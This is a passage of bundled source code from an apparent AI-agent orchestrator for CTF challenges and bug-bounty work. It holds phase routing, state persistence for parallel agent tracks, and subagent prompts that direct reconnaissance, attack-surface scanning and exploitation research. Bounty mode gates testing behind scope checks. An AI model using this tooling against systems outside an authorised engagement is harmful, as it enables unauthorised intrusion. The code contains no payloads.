  const routing = modeRouting(state, config2);
  const alternativesCount = state.alternatives.filter((item) => item.trim().length > 0).length;
  const evidenceReady = hasObservationEvidence(state);
  const crossValidated = state.unsatCrossValidationCount >= 2;
  const unhookedOracle = state.unsatUnhookedOracleRun;
  const digestVerified = state.unsatArtifactDigestVerified;
  const strongGateMet = crossValidated && unhookedOracle && digestVerified;
  const missingConditions = [];
  if (!crossValidated)
    missingConditions.push(`cross-validation(${state.unsatCrossValidationCount}/2)`);
  if (!unhookedOracle)
    missingConditions.push("unhooked-oracle-reproduction");
  if (!digestVerified)
    missingConditions.push("artifact-digest-verification");
  if (state.mode !== "CTF") {
    if (alternativesCount < 2 || !evidenceReady || !strongGateMet) {
      return {
        primary: "bounty-triage",
        reason: `UNSAT gate (BOUNTY): blocked. Missing: ${missingConditions.join(", ")}. Need 2+ alternatives, observation evidence, and all 3 verification conditions.`,
        followups: [routing.stuck[state.targetType]]
      };
    }
    return {
      primary: routing.stuck[state.targetType],
      reason: "UNSAT gate (BOUNTY) satisfied: alternatives/evidence/strong-gate all present; escalate via target-aware stuck route."
    };
  }
  if (alternativesCount < 2 || !evidenceReady || !strongGateMet) {
    return {
      primary: "ctf-hypothesis",
      reason: `UNSAT gate: blocked. Missing: ${missingConditions.join(", ")}. Need 2+ independent extraction methods, unhooked oracle reproduction, and artifact digest verification.`,
      followups: [routing.stuck[state.targetType]]
    };
  }
  return {
    primary: routing.stuck[state.targetType],
    reason: "UNSAT gate satisfied: alternatives/evidence/strong-gate present, pivot via stuck route for deep validation."
  };
}
function failureDrivenRoute(state, config2) {
  if (state.lastFailureReason === "context_overflow") {
    return routeForContextOverflowFailure(state, config2);
  }
  if (state.lastFailureReason === "verification_mismatch" && (state.phase === "EXECUTE" || state.phase === "VERIFY")) {
    return routeForVerificationMismatchFailure(state, config2);
  }
  if (state.lastFailureReason === "tooling_timeout") {
    return {
      primary: modeRouting(state, config2).failover[state.targetType],
      reason: "Recent failure indicates timeout/quota pressure: use failover route."
    };
  }
  if (state.lastFailureReason === "exploit_chain") {
    return {
      primary: modeRouting(state, config2).stuck[state.targetType],
      reason: "Recent exploit-chain failure: pivot with target-specific stuck strategy."
    };
  }
  if (state.lastFailureReason === "hypothesis_stall" && isStuck(state, config2)) {
    return routeForHypothesisStallFailure(state, config2);
  }
  if (state.lastFailureReason === "static_dynamic_contradiction") {
    return routeForStaticDynamicContradictionFailure(state, config2);
  }
  if (state.lastFailureReason === "unsat_claim") {
    return routeForUnsatFailure(state, config2);
  }
  return null;
}
function isRiskyCtfCandidate(state, config2) {
  const fastVerify = config2?.ctf_fast_verify;
  const candidateLevel = state.candidateLevel;
  const riskyTargets = new Set(fastVerify?.risky_targets ?? ["WEB_API", "WEB3", "PWN", "REV", "CRYPTO", "FORENSICS", "MISC", "UNKNOWN"]);
  const enforceAllTargets = fastVerify?.enforce_all_targets ?? true;
  if (enforceAllTargets) {
    riskyTargets.add("WEB_API");
    riskyTargets.add("WEB3");
    riskyTargets.add("PWN");
    riskyTargets.add("REV");
    riskyTargets.add("CRYPTO");
    riskyTargets.add("FORENSICS");
    riskyTargets.add("MISC");
    riskyTargets.add("UNKNOWN");
  }
  const requireNonemptyCandidate = fastVerify?.require_nonempty_candidate ?? true;
  if (candidateLevel === "L0" || candidateLevel === "L1") {
    return true;
  }
  if (state.verifyFailCount > 0 || state.noNewEvidenceLoops > 0 || state.samePayloadLoops > 0) {
    return true;
  }
  if (requireNonemptyCandidate && state.latestCandidate.trim().length === 0) {
    return true;
  }
  if (isLowConfidenceCandidate(state.latestCandidate)) {
    return true;
  }
  if (candidateLevel === "L2" || candidateLevel === "L3") {
    return false;
  }
  if (riskyTargets.has(state.targetType)) {
    return true;
  }
  return false;
}
function route(state, config2) {
  const resolvedConfig = config2 ?? OrchestratorConfigSchema.parse({});
  const routing = modeRouting(state, resolvedConfig);
  const knownRoutes = allKnownRoutes(resolvedConfig);
  if (state.decoySuspect && state.mode === "CTF") {
    const decoyPivotRoute = contradictionPivotPrimary(state, config2);
    const domainGuidance = {
      REV: "Use patch-and-dump or dynamic tracing to extract internal buffers.",
      PWN: "Use patch-and-dump or dynamic tracing to extract internal buffers.",
      WEB_API: "Try different endpoints/parameters. The flag path may involve a different vulnerability class.",
      WEB3: "Check for decoy contracts or hidden state. Simulate with different parameters.",
      CRYPTO: "The decryption path may be intentionally misleading. Try alternative attack vectors or parameter sets.",
      FORENSICS: "Check for layered steganography or misleading metadata. Use multiple extraction tools.",
      MISC: "The obvious solution is likely a red herring. Try alternative interpretations."
    };
    const guidance = domainGuidance[state.targetType] || "Re-evaluate the approach with fresh hypothesis.";
    const playbookNextRoute = findPlaybookNextRouteAction(state, resolvedConfig);
    const playbookRoute = playbookNextRoute?.route;
    const playbookRouteApplied = Boolean(playbookRoute && knownRoutes.has(playbookRoute));
    const primary = playbookRouteApplied && playbookRoute ? playbookRoute : decoyPivotRoute;
    const reason = playbookRouteApplied && playbookNextRoute ? appendPlaybookRuleReason(`DECOY_SUSPECT active (${state.decoySuspectReason}): flag-like string found but oracle failed. ${guidance}`, playbookNextRoute.ruleId) : `DECOY_SUSPECT active (${state.decoySuspectReason}): flag-like string found but oracle failed. ${guidance}`;
    return {
      primary,
      reason,
      followups: ["ctf-verify"]
    };
  }
  if (state.phase === "SUBMIT" && state.mode === "CTF" && !state.submissionAccepted) {
    return {
      primary: routing.execute[state.targetType],
      reason: "SUBMIT gate active: collect acceptance oracle evidence and finalize with submit_accepted before treating as solved.",
      followups: ["ctf_evidence_ledger"]
    };
  }
  if (hasActiveContradictionArtifactLock(state) && !(state.mode === "BOUNTY" && !state.scopeConfirmed)) {
    const playbookNextRoute = findPlaybookNextRouteAction(state, resolvedConfig);
    const playbookRoute = playbookNextRoute?.route;
    const playbookRouteApplied = Boolean(playbookRoute && knownRoutes.has(playbookRoute));
    const primary = playbookRouteApplied && playbookRoute ? playbookRoute : contradictionPivotPrimary(state, config2);
    if (state.contradictionPivotDebt > 0) {
      return {
        primary,
        reason: playbookRouteApplied && playbookNextRoute ? appendPlaybookRuleReason(`Contradiction pivot active: run extraction-first pivot within ${state.contradictionPivotDebt} dispatch loops.`, playbookNextRoute.ruleId) : `Contradiction pivot active: run extraction-first pivot within ${state.contradictionPivotDebt} dispatch loops.`,
        followups: [routing.stuck[state.targetType]]
      };
    }
    return {
      primary,
      reason: playbookRouteApplied && playbookNextRoute ? appendPlaybookRuleReason("Contradiction artifact lock active: extraction-first pivot remains mandatory until artifact path evidence is recorded.", playbookNextRoute.ruleId) : "Contradiction artifact lock active: extraction-first pivot remains mandatory until artifact path evidence is recorded.",
      followups: [routing.stuck[state.targetType]]
    };
  }
  if (state.contextFailCount >= 2 || state.timeoutFailCount >= 2) {
    if (state.phase === "EXECUTE") {
      return {
        primary: routing.stuck[state.targetType],
        reason: "EXECUTE timeout/context debt detected: keep solving route primary and run md-scribe only as followup compaction.",
        followups: ["md-scribe"]
      };
    }
    if (state.mdScribePrimaryStreak >= 2) {
      return {
        primary: routing.stuck[state.targetType],
        reason: "md-scribe guard: consecutive logging route threshold reached, pivot to target-aware stuck route instead of repeating md-scribe."
      };
    }
    return {
      primary: "md-scribe",
      reason: "Context/timeout failures exceeded threshold: compact and refresh durable notes before continuing.",
      followups: [routing.stuck[state.targetType]]
    };
  }
  if (state.mode === "BOUNTY" && !state.scopeConfirmed) {
    return {
      primary: "bounty-scope",
      reason: "BOUNTY mode requires scope confirmation before active validation."
    };
  }
  const failureRoute = failureDrivenRoute(state, config2);
  if (failureRoute) {
    return failureRoute;
  }
  if (state.candidatePendingVerification) {
    if (state.mode === "CTF") {
      if (state.lastFailureReason === "verification_mismatch") {
        return {
          primary: "ctf-decoy-check",
          reason: "Verification mismatch detected: run decoy-check before re-verify.",
          followups: ["ctf-verify"]
        };
      }
      const fastVerifyEnabled = config2?.ctf_fast_verify?.enabled ?? true;
      if (fastVerifyEnabled && !isRiskyCtfCandidate(state, config2)) {
        return {
          primary: "ctf-verify",
          reason: "Low-risk CTF candidate: run direct verification fast-path."
        };
      }
      return {
        primary: "ctf-decoy-check",
        reason: "Candidate found: run decoy check before official verification.",
        followups: ["ctf-verify"]
      };
    }
    return {
      primary: "bounty-triage",
      reason: "Candidate in BOUNTY requires minimal-impact reproducible verification."
    };
  }
  if (state.mode === "BOUNTY" && state.readonlyInconclusiveCount >= 2) {
    return {
      primary: "bounty-research",
      reason: "Two inconclusive read-only checks: escalate to safe CVE hypothesis research."
    };
  }
  if (isStuck(state, config2)) {
    return {
      primary: routing.stuck[state.targetType],
      reason: `Common stuck trigger: pivot using target-aware route '${routing.stuck[state.targetType]}'.`
    };
  }
  if (state.phase === "SCAN") {
    return {
      primary: routing.scan[state.targetType],
      reason: `Start in SCAN phase with target-aware route '${routing.scan[state.targetType]}'.`
    };
  }
  if (state.phase === "PLAN") {
    return {
      primary: routing.plan[state.targetType],
      reason: `PLAN phase: use '${routing.plan[state.targetType]}' for target-specific planning rigor.`,
      followups: [routing.execute[state.targetType]]
    };
  }
  return {
    primary: routing.execute[state.targetType],
    reason: "EXECUTE phase: follow plan-backed TODO list (one in_progress), then verify/log.",
    followups: state.mode === "CTF" ? ["ctf-verify"] : []
  };
}
function resolveFailoverAgent(originalAgent, errorText, config2) {
  const lowered = errorText.toLowerCase();
  const matched = config2.signatures.some((signature) => lowered.includes(signature.toLowerCase()));
  if (!matched) {
    return null;
  }
  if (originalAgent === "explore")
    return config2.map.explore;
  if (originalAgent === "librarian")
    return config2.map.librarian;
  if (originalAgent === "oracle")
    return config2.map.oracle;
  return null;
}

// src/utils/sdk-response.ts
function hasErrorResponse(result) {
  if (!isRecord(result)) {
    return false;
  }
  return Boolean(result.error);
}

// src/orchestration/parallel.ts
init_debug_log();
import { existsSync as existsSync5, mkdirSync, readFileSync as readFileSync5, renameSync, writeFileSync } from "fs";
import { dirname as dirname2, join as join6 } from "path";
var groupsByParent = new Map;
var parallelStateFilePath = null;
var persistTimer = null;
var persistenceBlockedByFutureSchema = false;
var PERSIST_DEBOUNCE_MS = 40;
var PARALLEL_STATE_SCHEMA_VERSION = 2;
function toPersistedTrack(track) {
  return {
    sessionID: track.sessionID,
    purpose: track.purpose,
    agent: track.agent,
    provider: track.provider,
    status: track.status,
    createdAt: track.createdAt,
    completedAt: track.completedAt,
    result: track.result,
    isWinner: track.isWinner
  };
}
function fromPersistedTrack(track) {
  return {
    ...track,
    prompt: ""
  };
}
function serializeGroups() {
  const groups = [];
  for (const [, parentGroups] of groupsByParent.entries()) {
    for (const group of parentGroups) {
      groups.push({
        parentSessionID: group.parentSessionID,
        label: group.label,
        tracks: group.tracks.map(toPersistedTrack),
        createdAt: group.createdAt,
        completedAt: group.completedAt,
        winnerSessionID: group.winnerSessionID,
        winnerRationale: typeof group.winnerRationale === "string" ? group.winnerRationale : "",
        maxTracks: group.maxTracks
      });
    }
  }
  return {
    schemaVersion: PARALLEL_STATE_SCHEMA_VERSION,
    updatedAt: new Date().toISOString(),
    groups
  };
}
function loadPersistedGroups() {
  groupsByParent.clear();
  persistenceBlockedByFutureSchema = false;
  if (!parallelStateFilePath || !existsSync5(parallelStateFilePath)) {
    return;
  }
  try {
    const raw = readFileSync5(parallelStateFilePath, "utf-8");
    const parsed = JSON.parse(raw);
    if (parsed && typeof parsed === "object" && "schemaVersion" in parsed && typeof parsed.schemaVersion === "number" && parsed.schemaVersion !== PARALLEL_STATE_SCHEMA_VERSION) {
      persistenceBlockedByFutureSchema = true;
      return;
    }
    const groups = Array.isArray(parsed?.groups) ? parsed.groups : [];
    for (const group of groups) {
      if (!group || typeof group !== "object")
        continue;
      const parentSessionID = typeof group.parentSessionID === "string" ? group.parentSessionID : "";
      if (!parentSessionID)
        continue;
      const tracksRaw = Array.isArray(group.tracks) ? group.tracks : [];
      const tracks = tracksRaw.filter((item) => Boolean(item) && typeof item === "object").map(fromPersistedTrack);
      const hydrated = {
        parentSessionID,
        label: typeof group.label === "string" ? group.label : "parallel",
        tracks,
        queue: [],
        parallel: {
          capDefault: 2,
          providerCaps: {},
          queueEnabled: true
        },
        createdAt: typeof group.createdAt === "number" ? group.createdAt : Date.now(),
        completedAt: typeof group.completedAt === "number" ? group.completedAt : 0,
        winnerSessionID: typeof group.winnerSessionID === "string" ? group.winnerSessionID : "",
        winnerRationale: typeof group.winnerRationale === "string" ? group.winnerRationale : "",
        maxTracks: typeof group.maxTracks === "number" ? group.maxTracks : tracks.length
      };
      const existing = groupsByParent.get(parentSessionID) ?? [];
      existing.push(hydrated);
      groupsByParent.set(parentSessionID, existing);
    }
  } catch (error48) {
    debugLog("parallel", "loadPersistedGroups failed", error48);
    return;
  }
}
function configureParallelPersistence(projectDir, rootDirName = ".Aegis") {
  parallelStateFilePath = join6(projectDir, rootDirName, "parallel_state.json");
  loadPersistedGroups();
}
function persistParallelGroups() {
  if (!parallelStateFilePath || persistenceBlockedByFutureSchema) {
    return;
  }
  try {
    mkdirSync(dirname2(parallelStateFilePath), { recursive: true });
    const tmp = `${parallelStateFilePath}.tmp`;
    const payload = `${JSON.stringify(serializeGroups())}
`;
    writeFileSync(tmp, payload, "utf-8");
    renameSync(tmp, parallelStateFilePath);
  } catch (error48) {
    debugLog("parallel", "persistParallelGroups failed", error48);
    return;
  }
}
function persistParallelGroupsDeferred() {
  if (persistenceBlockedByFutureSchema || persistTimer) {
    return;
  }
  persistTimer = setTimeout(() => {
    persistTimer = null;
    persistParallelGroups();
  }, PERSIST_DEBOUNCE_MS);
  if (persistTimer && typeof persistTimer.unref === "function") {
    persistTimer.unref();
  }
}
function getGroups(parentSessionID) {
  return groupsByParent.get(parentSessionID) ?? [];
}
function getActiveGroup(parentSessionID) {
  const groups = getGroups(parentSessionID);
  if (groups.length === 0)
    return null;
  const last = groups[groups.length - 1];
  if (last.completedAt > 0)
    return null;
  return last;
}
function getAllGroups() {
  return groupsByParent;
}
var TARGET_SCAN_AGENTS = {
  WEB_API: "ctf-web",
  WEB3: "ctf-web3",
  PWN: "ctf-pwn",
  REV: "ctf-rev",
  CRYPTO: "ctf-crypto",
  FORENSICS: "ctf-forensics",
  MISC: "ctf-explore",
  UNKNOWN: "ctf-explore"
};
var BOUNTY_TRIAGE_EVIDENCE_CLASSES = [
  "HTTP headers and security header posture",
  "TLS certificates and endpoint identity metadata",
  "public content surfaces and response body clues",
  "client-side JavaScript behavior and exposed routes",
  "API surface shape and parameter behavior"
];
function withPromptContract(uniqueFocus, doNotCover, body) {
  return [
    `UniqueFocus: ${uniqueFocus}`,
    `DoNotCover: ${doNotCover.join("; ")}`,
    "OutputContract: Return ONLY valid JSON. No markdown, code fences, or prose.",
    'OutputSchema: {"findings":[...],"evidence":[...],"next_todo":[...]}',
    "OutputRules: findings/evidence/next_todo must be arrays. Use [] when unknown.",
    "",
    body
  ].join(`
`);
}
var REASK_JSON_ONLY_PROMPT = [
  "Your previous response was invalid for the required contract.",
  "Return ONLY valid JSON. No markdown, no code fences, no prose.",
  'Schema: {"findings":[...],"evidence":[...],"next_todo":[...]}',
  "Rules:",
  "- findings: array",
  "- evidence: array",
  "- next_todo: array of short strings",
  "- use [] when unknown"
].join(`
`);
function stableStringify(value) {
  if (value === null || value === undefined)
    return "";
  if (typeof value === "string")
    return value;
  if (typeof value === "number" || typeof value === "boolean")
    return String(value);
  if (Array.isArray(value)) {
    return `[${value.map((item) => stableStringify(item)).join(",")}]`;
  }
  if (typeof value === "object") {
    const obj = value;
    const keys = Object.keys(obj).sort();
    const parts = keys.map((key) => `${key}:${stableStringify(obj[key])}`);
    return `{${parts.join(",")}}`;
  }
  return String(value);
}
function normalizeText(value) {
  return value.toLowerCase().replace(/\s+/g, " ").replace(/["'`]/g, "").trim();
}
function fnv1aHash(input) {
  let hash2 = 2166136261;
  for (let i = 0;i < input.length; i += 1) {
    hash2 ^= input.charCodeAt(i);
    hash2 = Math.imul(hash2, 16777619);
  }
  return (hash2 >>> 0).toString(16).padStart(8, "0");
}
function toTokenSet(text) {
  const cleaned = normalizeText(text).replace(/[^a-z0-9 ]/g, " ");
  const tokens = cleaned.split(" ").map((token) => token.trim()).filter((token) => token.length >= 3);
  return new Set(tokens);
}
function jaccardSimilarity(a, b) {
  const aSet = toTokenSet(a);
  const bSet = toTokenSet(b);
  if (aSet.size === 0 && bSet.size === 0)
    return 1;
  if (aSet.size === 0 || bSet.size === 0)
    return 0;
  let intersection2 = 0;
  for (const token of aSet) {
    if (bSet.has(token))
      intersection2 += 1;
  }
  const union2 = aSet.size + bSet.size - intersection2;
  if (union2 <= 0)
    return 0;
  return intersection2 / union2;
}
function ensureStringArray(input) {
  if (!Array.isArray(input))
    return [];
  const output = [];
  for (const item of input) {
    const value = typeof item === "string" ? item.trim() : stableStringify(item).trim();
    if (value)
      output.push(value);
  }
  return output;
}
function parseStructuredResult(text) {
  let parsed;
  try {
    parsed = JSON.parse(text);
  } catch {
    return null;
  }
  if (!parsed || typeof parsed !== "object" || Array.isArray(parsed))
    return null;
  const record2 = parsed;
  const findingsRaw = record2.findings;
  const evidenceRaw = record2.evidence;
  const nextTodoRaw = record2.next_todo;
  if (findingsRaw !== undefined && !Array.isArray(findingsRaw))
    return null;
  if (evidenceRaw !== undefined && !Array.isArray(evidenceRaw))
    return null;
  if (nextTodoRaw !== undefined && !Array.isArray(nextTodoRaw))
    return null;
  return {
    findings: Array.isArray(findingsRaw) ? findingsRaw : [],
    evidence: Array.isArray(evidenceRaw) ? evidenceRaw : [],
    next_todo: ensureStringArray(nextTodoRaw)
  };
}
function findingCanonicalText(finding) {
  if (typeof finding === "string")
    return normalizeText(finding);
  if (!finding || typeof finding !== "object" || Array.isArray(finding)) {
    return normalizeText(stableStringify(finding));
  }
  const rec = finding;
  const preferred = ["title", "summary", "finding", "text", "description"];
  const values = preferred.map((key) => rec[key]).filter((value) => value !== undefined).map((value) => stableStringify(value));
  if (values.length > 0) {
    return normalizeText(values.join(" | "));
  }
  const sanitized = {};
  for (const [key, value] of Object.entries(rec)) {
    if (key === "id" || key === "finding_id" || key === "findingId" || key.toLowerCase().endsWith("_id")) {
      continue;
    }
    sanitized[key] = value;
  }
  return normalizeText(stableStringify(sanitized));
}
function evidenceTuple(evidence) {
  if (!evidence || typeof evidence !== "object" || Array.isArray(evidence)) {
    return {
      findingID: "",
      source: "",
      quote: normalizeText(stableStringify(evidence))
    };
  }
  const rec = evidence;
  const findingID = normalizeText(stableStringify(rec.finding_id ?? rec.findingId ?? rec.id ?? ""));
  const source = normalizeText(stableStringify(rec.source ?? rec.path ?? rec.file ?? rec.url ?? ""));
  const quote = normalizeText(stableStringify(rec.quote ?? rec.excerpt ?? rec.text ?? rec.content ?? ""));
  return { findingID, source, quote };
}
function mergeStructuredResults(items) {
  const findings = [];
  const findingsSeen = new Set;
  const findingTexts = [];
  const evidence = [];
  const evidenceSeen = new Set;
  const nextTodo = [];
  const nextTodoSeen = new Set;
  for (const item of items) {
    for (const finding of item.findings) {
      const canonical = findingCanonicalText(finding);
      const exactKey = fnv1aHash(canonical);
      if (findingsSeen.has(exactKey))
        continue;
      let nearDuplicate = false;
      for (const existing of findingTexts) {
        if (jaccardSimilarity(existing, canonical) >= 0.92) {
          nearDuplicate = true;
          break;
        }
      }
      if (nearDuplicate)
        continue;
      findingsSeen.add(exactKey);
      findingTexts.push(canonical);
      findings.push(finding);
    }
    for (const evidenceItem of item.evidence) {
      const tuple2 = evidenceTuple(evidenceItem);
      const evidenceKey = fnv1aHash(`${tuple2.findingID}|${tuple2.source}|${tuple2.quote}`);
      if (evidenceSeen.has(evidenceKey))
        continue;
      evidenceSeen.add(evidenceKey);
      evidence.push(evidenceItem);
    }
    for (const todo of item.next_todo) {
      const normalized = normalizeText(todo);
      if (!normalized || nextTodoSeen.has(normalized))
        continue;
      nextTodoSeen.add(normalized);
      nextTodo.push(todo);
    }
  }
  return {
    findings,
    evidence,
    next_todo: nextTodo
  };
}
function extractMessagesAndLastAssistant(data) {
  const messages = [];
  let lastAssistant = "";
  if (!Array.isArray(data)) {
    return { messages, lastAssistant };
  }
  for (const msg of data) {
    if (!msg || typeof msg !== "object")
      continue;
    const m = msg;
    const role = typeof m.role === "string" ? m.role : m.info && typeof m.info === "object" && typeof m.info.role === "string" ? String(m.info.role) : "";
    const parts = Array.isArray(m.parts) ? m.parts : [];
    const text = parts.map((p) => {
      if (!p || typeof p !== "object")
        return "";
      const part = p;
      return typeof part.text === "string" ? part.text : "";
    }).filter(Boolean).join(`
`);
    if (!text)
      continue;
    messages.push(`[${role}] ${text.slice(0, 1000)}`);
    if (role === "assistant") {
      lastAssistant = text;
    }
  }
  return { messages, lastAssistant };
}
function providerIdFromModel3(model) {
  const trimmed = model.trim();
  const idx = trimmed.indexOf("/");
  if (idx === -1)
    return trimmed;
  return trimmed.slice(0, idx);
}
function providerForAgent(agent) {
  const model = agentModel(agent);
  if (!model)
    return "unknown";
  const provider = providerIdFromModel3(model);
  return provider || "unknown";
}
function trackPlanSortKey(trackPlan) {
  return `${providerForAgent(trackPlan.agent)}|${trackPlan._index.toString().padStart(6, "0")}|${trackPlan.agent}|${trackPlan.purpose}`;
}
function cloneModelHealth(state) {
  if (!state)
    return {};
  return { ...state.modelHealthByModel };
}
function cloneDispatchHealth(state) {
  if (!state)
    return {};
  return { ...state.dispatchHealthBySubagent };
}
function isSubagentUnhealthy(state, agent) {
  if (!state)
    return false;
  const baseAgent = baseAgentName(agent);
  const health = state.dispatchHealthBySubagent[baseAgent];
  if (!health)
    return false;
  return health.consecutiveFailureCount >= 2 || health.hardFailureCount > health.successCount;
}
function unresolvedModelIsUnhealthy(state, model, cooldownMs) {
  if (!state || !model)
    return false;
  return !isModelHealthy(state, model, cooldownMs);
}
function resolveHealthyAgentForTrack(trackPlan, state, cooldownMs) {
  if (!state) {
    const provider = providerForAgent(trackPlan.agent);
    return { trackPlan, provider, canDispatch: true };
  }
  const currentProvider = providerForAgent(trackPlan.agent);
  const currentModel = agentModel(trackPlan.agent);
  const desiredModel = resolveHealthyModel(trackPlan.agent, state, cooldownMs);
  const desiredHealthy = desiredModel ? isModelHealthy(state, desiredModel, cooldownMs) : true;
  if (!desiredModel || !desiredHealthy) {
    return { trackPlan, provider: currentProvider, canDispatch: false };
  }
  if (desiredModel === currentModel) {
    return { trackPlan, provider: currentProvider, canDispatch: true };
  }
  const baseAgent = baseAgentName(trackPlan.agent);
  if (!shouldGenerateVariants(baseAgent)) {
    return {
      trackPlan: { ...trackPlan, agent: baseAgent },
      provider: providerIdFromModel3(desiredModel),
      canDispatch: true
    };
  }
  if (!isKnownModelId(desiredModel)) {
    return {
      trackPlan: { ...trackPlan, agent: baseAgent },
      provider: providerIdFromModel3(desiredModel),
      canDispatch: true
    };
  }
  const fallbackAgent = variantAgentName(baseAgent, desiredModel);
  return {
    trackPlan: { ...trackPlan, agent: fallbackAgent },
    provider: providerIdFromModel3(desiredModel),
    canDispatch: true
  };
}
function effectiveProviderCap(provider, capDefault, providerCaps, modelHealthByModel, dispatchHealthBySubagent) {
  const baseCap = providerCaps[provider] ?? capDefault;
  if (baseCap <= 0)
    return baseCap;
  let penalty = 0;
  const hasUnhealthyModelForProvider = Object.keys(modelHealthByModel).some((model) => providerIdFromModel3(model) === provider);
  if (hasUnhealthyModelForProvider)
    penalty += 1;
  const hasUnhealthySubagent = Object.entries(dispatchHealthBySubagent).some(([subagent, health]) => {
    const model = agentModel(subagent);
    if (!model || providerIdFromModel3(model) !== provider)
      return false;
    return health.consecutiveFailureCount >= 2 || health.hardFailureCount > health.successCount;
  });
  if (hasUnhealthySubagent)
    penalty += 1;
  if (penalty <= 0)
    return baseCap;
  return Math.max(1, baseCap - penalty);
}
function planScanDispatch(state, config2, challengeDescription) {
  const target = state.targetType;
  if (state.mode === "BOUNTY") {
    const bountyBasePrompt = challengeDescription.trim() ? `[Parallel SCAN track]

Target:
${challengeDescription.slice(0, 2000)}

` : `[Parallel SCAN track]

`;
    if (!state.scopeConfirmed) {
      return {
        tracks: [
          {
            purpose: "scope-first",
            agent: "bounty-scope",
            prompt: withPromptContract("scope-first focused on scope confirmation", ["Active validation", "Exploit attempts"], `${bountyBasePrompt}Scope is not confirmed. Perform scope confirmation and safe target framing only. Do not run active validation.`)
          }
        ],
        label: "scan-bounty-scope"
      };
    }
    const bountyScanAgent = config2.routing.bounty.scan[target] ?? "bounty-triage";
    const bountyScan = config2.parallel.bounty_scan;
    const maxTracks = bountyScan.max_tracks;
    const triageTracks = bountyScan.triage_tracks;
    const researchTracks = bountyScan.research_tracks;
    const scopeRecheckTracks = bountyScan.scope_recheck_tracks;
    const requestedTracks = triageTracks + researchTracks + scopeRecheckTracks;
    const tracks2 = [];
    const addTrack = (purposePrefix, agent, count, buildPromptText) => {
      for (let i = 0;i < count; i += 1) {
        const index = count > 1 ? `-${i + 1}` : "";
        tracks2.push({
          purpose: `${purposePrefix}${index}`,
          agent,
          prompt: buildPromptText(i, count)
        });
      }
    };
    if (requestedTracks <= 0) {
      addTrack("surface-triage", bountyScanAgent, 1, (index, count) => {
        const evidenceClass = BOUNTY_TRIAGE_EVIDENCE_CLASSES[index % BOUNTY_TRIAGE_EVIDENCE_CLASSES.length];
        return withPromptContract(`surface-triage TrackIndex=${index + 1}/${count} focused on ${evidenceClass}`, [
          "Bounty research hypothesis generation",
          "Scope recheck and policy revalidation"
        ], `${bountyBasePrompt}Run scope-safe surface triage in parallel. Prioritize read-only reconnaissance and minimal-impact evidence collection. Output top 5 observations and one safest next action.`);
      });
      addTrack("bounty-research", "bounty-research", 1, () => withPromptContract("bounty-research focused on external vuln pattern and prior-art mapping", [
        "Surface triage evidence collection",
        "Scope boundary re-validation"
      ], `${bountyBasePrompt}Research target-relevant vulnerability classes and known patterns. Return top 3 hypotheses with cheapest low-impact validation for each.`));
      addTrack("scope-recheck", "bounty-scope", 1, () => withPromptContract("scope-recheck focused on in-scope boundaries and safety constraints", [
        "Surface triage evidence collection",
        "External vulnerability research"
      ], `${bountyBasePrompt}Re-validate in-scope boundaries, assets, and safe testing constraints. List explicit must-not-do actions before execution phase.`));
    } else {
      addTrack("surface-triage", bountyScanAgent, triageTracks, (index, count) => {
        const evidenceClass = BOUNTY_TRIAGE_EVIDENCE_CLASSES[index % BOUNTY_TRIAGE_EVIDENCE_CLASSES.length];
        const allClasses = BOUNTY_TRIAGE_EVIDENCE_CLASSES.slice(0, Math.max(count, 2));
        const forbiddenClasses = allClasses.filter((item) => item !== evidenceClass).slice(0, 2).map((item) => `surface-triage evidence class: ${item}`);
        return withPromptContract(`surface-triage TrackIndex=${index + 1}/${count} focused on ${evidenceClass}`, [...forbiddenClasses, "Bounty research hypothesis generation", "Scope recheck and policy revalidation"], `${bountyBasePrompt}Run scope-safe surface triage in parallel. Prioritize read-only reconnaissance and minimal-impact evidence collection. Output top 5 observations and one safest next action.`);
      });
      addTrack("bounty-research", "bounty-research", researchTracks, (index, count) => withPromptContract(`bounty-research TrackIndex=${index + 1}/${count} focused on external vuln pattern and prior-art mapping`, [
        "Surface triage evidence collection",
        "Scope boundary re-validation"
      ], `${bountyBasePrompt}Research target-relevant vulnerability classes and known patterns. Return top 3 hypotheses with cheapest low-impact validation for each.`));
      addTrack("scope-recheck", "bounty-scope", scopeRecheckTracks, (index, count) => withPromptContract(`scope-recheck TrackIndex=${index + 1}/${count} focused on in-scope boundaries and safety constraints`, [
        "Surface triage evidence collection",
        "External vulnerability research"
      ], `${bountyBasePrompt}Re-validate in-scope boundaries, assets, and safe testing constraints. List explicit must-not-do actions before execution phase.`));
    }
    return { tracks: tracks2.slice(0, maxTracks), label: `scan-bounty-${target.toLowerCase()}` };
  }
  const domainAgent = TARGET_SCAN_AGENTS[target] ?? "ctf-explore";
  const basePrompt = challengeDescription.trim() ? `[Parallel SCAN track]

Challenge:
${challengeDescription.slice(0, 2000)}

` : `[Parallel SCAN track]

`;
  const tracks = [
    {
      purpose: "fast-recon",
      agent: "ctf-explore",
      prompt: `${withPromptContract("fast-recon focused on file types, protections, strings, directory layout, and top observations", [
        `domain-scan-${target.toLowerCase()} deep domain tool analysis`,
        "research-cve external CVE and writeup research"
      ], `${basePrompt}Perform fast initial reconnaissance. Identify file types, protections, strings, basic structure. Output SCAN.md-style summary with top 5 observations. Do NOT attempt to solve yet.`)}`
    },
    {
      purpose: `domain-scan-${target.toLowerCase()}`,
      agent: domainAgent,
      prompt: `${withPromptContract(`domain-scan-${target.toLowerCase()} focused on domain-specific deep scan and tool-driven analysis`, [
        "fast-recon generic file inventory and broad triage",
        "research-cve external CVE and writeup research"
      ], `${basePrompt}Perform domain-specific deep scan for ${target} target. Focus on attack surface, vulnerability patterns, and tool-specific analysis (e.g., checksec for PWN, endpoint enumeration for WEB_API). Output structured observations.`)}`
    },
    {
      purpose: "research-cve",
      agent: "ctf-research",
      prompt: `${withPromptContract("research-cve focused on external CVEs, writeups, and prior exploitation patterns", [
        "fast-recon local file and binary inventory",
        `domain-scan-${target.toLowerCase()} local domain tool execution`
      ], `${basePrompt}Research known CVEs, CTF writeups, and exploitation techniques relevant to this challenge. Search for similar challenges, framework/library versions, and known vulnerability patterns. Return top 3 hypotheses with cheapest disconfirm test for each.`)}`
    }
  ];
  if (domainAgent === "ctf-explore") {
    tracks.splice(1, 1);
  }
  return { tracks, label: `scan-${target.toLowerCase()}` };
}
function planHypothesisDispatch(state, config2, hypotheses) {
  const agent = state.mode === "CTF" ? config2.routing.ctf.execute[state.targetType] ?? "aegis-exec" : !state.scopeConfirmed ? "bounty-scope" : config2.routing.bounty.execute[state.targetType] ?? "aegis-exec";
  const tracks = hypotheses.slice(0, 3).map((h, i) => ({
    purpose: `hypothesis-${i + 1}`,
    agent,
    prompt: [
